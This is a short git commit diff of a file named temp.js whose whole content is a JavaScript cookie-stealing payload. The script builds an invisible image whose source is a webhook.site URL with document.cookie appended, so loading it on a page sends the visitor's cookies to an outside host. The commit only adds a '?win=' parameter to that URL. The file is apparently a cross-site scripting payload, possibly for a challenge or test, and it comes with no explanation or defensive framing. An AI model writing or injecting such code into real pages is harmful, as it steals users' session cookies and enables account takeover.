ae80b8c7da070bcdd7875967d024847e653d50cb
Sean Ho <69450377+SeanHoWB@users.noreply.github.com>
2024-02-15 20:28:43 +0800

    Update temp.js

--- temp.js
+++ temp.js
@@ -1,4 +1,4 @@
 var img = new Image(0, 0);
 img.src =
-  "https://webhook.site/6e74f7ad-2766-4560-b5e4-d4f639c9247d" + document.cookie;
+  "https://webhook.site/6e74f7ad-2766-4560-b5e4-d4f639c9247d/?win=" + document.cookie;
 document.body.appendChild(img);
